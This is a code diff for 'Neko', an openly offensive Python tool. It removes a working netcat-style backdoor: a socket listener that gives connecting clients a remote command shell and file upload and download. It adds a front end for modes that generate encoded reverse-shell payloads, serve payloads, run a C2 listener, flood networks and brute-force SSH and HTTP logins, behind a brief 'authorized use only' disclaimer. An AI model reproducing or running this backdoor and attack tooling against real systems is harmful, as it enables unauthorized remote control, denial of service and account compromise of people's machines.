@@ -1,171 +1,155 @@
-import socket
-import subprocess
-import shlex
 import argparse
-import textwrap
 import sys
-import threading
+import textwrap
 import os
+from .utils.logger import init_logger, get_logger, console
+from .core import NekoCore
+from .modes.recon import ReconMode
+from .modes.search import SearchMode
+from .modes.exploit import ExploitMode
+from .modes.attack import AttackMode
 
-def execute(cmd):
-    cmd = cmd.strip()
-    if not cmd:
-        return ''
-    try:
-        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
-        return output.decode()
-    except subprocess.CalledProcessError as e:
-        return f"[!] Command failed:\n{e.output.decode()}"
-    except FileNotFoundError:
-        return f"[!] Command not found: {cmd}\n"
-    except Exception as e:
-        return f"[!] Error executing command: {str(e)}\n"
+DISCLAIMER = """
+[bold red]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![/bold red]
+[bold white]NEKO OFFENSIVE SECURITY FRAMEWORK[/bold white]
+[bold yellow]Disclaimer: For authorized educational and testing use only.[/bold yellow]
+[bold yellow]Illegal use of this tool is strictly prohibited.[/bold yellow]
+[bold yellow]The authors are not responsible for any misuse.[/bold yellow]
+[bold red]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![/bold red]
+"""
 
-class Neko:
-    def __init__(self, args, buffer=None):
-        self.args = args
-        self.buffer = buffer
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def print_banner():
+    banner = r"""
+ [bold cyan]
+  _   _      _         
+ | \ | | ___| | _____  
+ |  \| |/ _ \ |/ / _ \ 
+ | |\  |  __/   < (_) |
+ |_| \_|\___|_|\_\___/ 
+                       
+  [v2.0.0] - Multi-mode Security Framework
+ [/bold cyan]
+    """
+    console.print(banner)
+    console.print(DISCLAIMER)
 
-    def run(self):
-        if self.args.listen:
-            self.listen()
-        else:
-            self.send()
+def setup_args():
+    parser = argparse.ArgumentParser(
+        prog="neko",
+        description='Neko: Multi-mode Security Framework',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    
+    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
+    parser.add_argument('-o', '--output', help='Save results to file (JSON/CSV)')
+    
+    subparsers = parser.add_subparsers(dest='mode', help='Operating mode')
 
-    def send(self):
-        try:
-            self.socket.settimeout(10)
-            self.socket.connect((self.args.target, self.args.port))
-            if self.buffer:
-                self.socket.send(self.buffer)
+    # --- NETCAT MODE (Default/Legacy) ---
+    nc_parser = subparsers.add_parser('core', help='Netcat-style core logic (default)')
+    nc_parser.add_argument('-c', '--command', action='store_true', help='Command shell')
+    nc_parser.add_argument('-e', '--execute', help='Execute a command on connection')
+    nc_parser.add_argument('-l', '--listen', action='store_true', help='Listen for incoming connections')
+    nc_parser.add_argument('-p', '--port', type=int, default=5555, help='Target port')
+    nc_parser.add_argument('-t', '--target', default='0.0.0.0', help='Target IP')
+    nc_parser.add_argument('-u', '--upload', help='Upload file to server')
+    nc_parser.add_argument('-d', '--download', help='Download file from server')
 
-            if self.args.download:
-                with open(self.args.download, 'wb') as f:
-                    while True:
-                        data = self.socket.recv(4096)
-                        if not data:
-                            break
-                        f.write(data)
-                print(f"[+] Downloaded file: {self.args.download}")
-                return
+    # --- RECON MODE ---
+    recon_parser = subparsers.add_parser('recon', help='Network reconnaissance')
+    recon_parser.add_argument('-t', '--target', required=True, help='Target IP/Domain/Subnet')
+    recon_parser.add_argument('--scan-ports', action='store_true', help='Perform port scan')
+    recon_parser.add_argument('--range', default='1-1024', help='Port range (e.g. 1-1024)')
+    recon_parser.add_argument('--dns', action='store_true', help='DNS enumeration')
+    recon_parser.add_argument('--whois', action='store_true', help='WHOIS lookup')
+    recon_parser.add_argument('--ping-sweep', action='store_true', help='Subnet host discovery')
 
-            while True:
-                recv_len = 1
-                response = ''
-                while recv_len:
-                    data = self.socket.recv(4096)
-                    recv_len = len(data)
-                    response += data.decode()
-                    if recv_len < 4096:
-                        break
-                if response:
-                    print(response)
-                    buffer = input('> ') + '\n'
-                    self.socket.send(buffer.encode())
-        except KeyboardInterrupt:
-            print('User terminated.')
-        except Exception as e:
-            print(f'[!] Connection failed: {e}')
-        finally:
-            self.socket.close()
+    # --- SEARCH MODE ---
+    search_parser = subparsers.add_parser('search', help='OSINT and CVE searching')
+    search_parser.add_argument('-t', '--target', help='Target IP/Domain')
+    search_parser.add_argument('--cve', help='Search CVEs by product/keyword')
+    search_parser.add_argument('--shodan', action='store_true', help='Search Shodan')
+    search_parser.add_argument('--api-key', help='API key for Shodan/NVD')
+    search_parser.add_argument('--dorks', action='store_true', help='Generate Google Dorks')
+    search_parser.add_argument('--subdomains', action='store_true', help='Subdomain enumeration')
+    search_parser.add_argument('--wordlist', help='Wordlist path')
 
-    def listen(self):
-        self.socket.bind((self.args.target, self.args.port))
-        self.socket.listen(5)
-        print(f'[+] Listening on {self.args.target}:{self.args.port}')
-        while True:
-            client_sock, _ = self.socket.accept()
-            client_thread = threading.Thread(
-                target=self.handle, args=(client_sock,)
-            )
-            client_thread.start()
+    # --- EXPLOIT MODE ---
+    exploit_parser = subparsers.add_parser('exploit', help='Exploitation aids')
+    exploit_parser.add_argument('--revshell', action='store_true', help='Generate reverse shell payload')
+    exploit_parser.add_argument('--lhost', help='Local host for reverse shell')
+    exploit_parser.add_argument('--lport', type=int, default=4444, help='Local port for reverse shell')
+    exploit_parser.add_argument('--type', choices=['bash', 'python', 'php', 'powershell'], default='bash', help='Payload type')
+    exploit_parser.add_argument('--encode', choices=['b64', 'url', 'xor'], help='Payload encoding')
+    exploit_parser.add_argument('--key', default='neko', help='XOR key')
+    exploit_parser.add_argument('--serve', action='store_true', help='Start HTTP payload server')
+    exploit_parser.add_argument('--dir', default='.', help='Directory to serve')
+    exploit_parser.add_argument('--port', type=int, default=8080, help='Port for HTTP server/C2 listener')
+    exploit_parser.add_argument('--c2', action='store_true', help='Start C2 listener')
 
-    def handle(self, client_sock):
-        try:
-            if self.args.execute:
-                output = execute(self.args.execute)
-                client_sock.send(output.encode())
+    # --- ATTACK MODE ---
+    attack_parser = subparsers.add_parser('attack', help='Active attacks and brute-force')
+    attack_parser.add_argument('-t', '--target', required=True, help='Target URL/IP/Domain')
+    attack_parser.add_argument('--flood', action='store_true', help='Network flooding')
+    attack_parser.add_argument('--protocol', choices=['tcp', 'udp'], default='tcp', help='Flooding protocol')
+    attack_parser.add_argument('--duration', type=int, default=10, help='Flood duration (seconds)')
+    attack_parser.add_argument('--port', type=int, help='Target port')
+    attack_parser.add_argument('--bruteforce', choices=['ssh', 'http'], help='Brute-force login')
+    attack_parser.add_argument('--user', default='root', help='Username for brute-force')
+    attack_parser.add_argument('--wordlist', help='Wordlist path')
+    attack_parser.add_argument('--dirbrute', action='store_true', help='HTTP directory brute-force')
+    attack_parser.add_argument('--takeover', action='store_true', help='Subdomain takeover check')
 
-            elif self.args.upload:
-                file_buffer = b''
-                while True:
-                    data = client_sock.recv(4096)
-                    if data:
-                        file_buffer += data
-                    else:
-                        break
-                with open(self.args.upload, 'wb') as f:
-                    f.write(file_buffer)
-                message = f'[+] Saved file to: {self.args.upload}'
-                client_sock.send(message.encode())
-
-            elif self.args.download:
-                try:
-                    with open(self.args.download, 'rb') as f:
-                        file_data = f.read()
-                    client_sock.send(file_data)
-                except Exception as e:
-                    error_msg = f'[!] Failed to read file: {e}'
-                    client_sock.send(error_msg.encode())
-
-            elif self.args.command:
-                cmd_buffer = b''
-                while True:
-                    client_sock.send(b'neko:#> ')
-                    while b'\n' not in cmd_buffer:
-                        data = client_sock.recv(64)
-                        if not data:
-                            break
-                        cmd_buffer += data
-
-                    command = cmd_buffer.decode().strip()
-                    if command.startswith('cd '):
-                        try:
-                            os.chdir(command[3:].strip())
-                            response = f"[+] Changed directory to {os.getcwd()}\n"
-                        except Exception as e:
-                            response = f"[!] cd failed: {e}\n"
-                    elif command in ['cls', 'clear']:
-                        response = '\n' * 100
-                    else:
-                        response = execute(command)
-
-                    client_sock.send(response.encode())
-                    cmd_buffer = b''
-
-        except Exception as e:
-            print(f'[!] Server crashed: {e}')
-        finally:
-            client_sock.close()
+    return parser
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='Neko: Netcat-style backdoor tool',
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=textwrap.dedent('''
-        Examples:
-          neko -t 192.168.1.109 -p 5050 -l -c           # Start command shell
-          neko -t 192.168.1.109 -p 5050 -l -u file.txt  # Upload file
-          neko -t 192.168.1.109 -p 5050 -l -e="dir"     # Execute command
-          neko -t 192.168.1.109 -p 5050 -d secret.txt   # Download file
-          echo "Hello" | neko -t 192.168.1.109 -p 5050  # Echo text to server
-        ''')
-    )
-    parser.add_argument('-c', '--command', action='store_true', help='Command shell')
-    parser.add_argument('-e', '--execute', help='Execute a command on connection')
-    parser.add_argument('-l', '--listen', action='store_true', help='Listen for incoming connections')
-    parser.add_argument('-p', '--port', type=int, default=5555, help='Target port')
-    parser.add_argument('-t', '--target', default='0.0.0.0', help='Target IP')
-    parser.add_argument('-u', '--upload', help='Upload file to server')
-    parser.add_argument('-d', '--download', help='Download file from server')
-    args = parser.parse_args()
+    parser = setup_args()
+    
+    # Handle legacy behavior if no mode provided (compatible with netcat-style)
+    # If first arg starts with -t, -p, -l etc, assume 'core' mode
+    args_list = sys.argv[1:]
+    if args_list and (args_list[0].startswith('-') and args_list[0] not in ['-v', '--verbose', '-o', '--output', '-h', '--help']):
+        args_list = ['core'] + args_list
+    
+    args = parser.parse_args(args_list)
+    
+    init_logger(args.verbose)
+    logger = get_logger()
+    
+    print_banner()
 
-    if args.listen:
-        buffer = ''
-    else:
-        buffer = sys.stdin.read()
+    if not args.mode:
+        parser.print_help()
+        sys.exit(0)
 
-    nk = Neko(args, buffer.encode())
-    nk.run()
+    try:
+        if args.mode == 'core':
+            # Handle stdin for legacy Neko send mode
+            buffer = ''
+            if not args.listen:
+                if not sys.stdin.isatty():
+                    buffer = sys.stdin.read()
+            nk = NekoCore(args, buffer.encode() if buffer else None)
+            nk.run()
+        elif args.mode == 'recon':
+            rm = ReconMode(args)
+            rm.run()
+        elif args.mode == 'search':
+            sm = SearchMode(args)
+            sm.run()
+        elif args.mode == 'exploit':
+            em = ExploitMode(args)
+            em.run()
+        elif args.mode == 'attack':
+            am = AttackMode(args)
+            am.run()
+    except KeyboardInterrupt:
+        logger.warning("\nUser interrupted execution. Exiting...")
+    except Exception as e:
+        logger.error(f"Execution failed: {e}")
+        if args.verbose:
+            import traceback
+            traceback.print_exc()
+
+if __name__ == '__main__':
+    main()
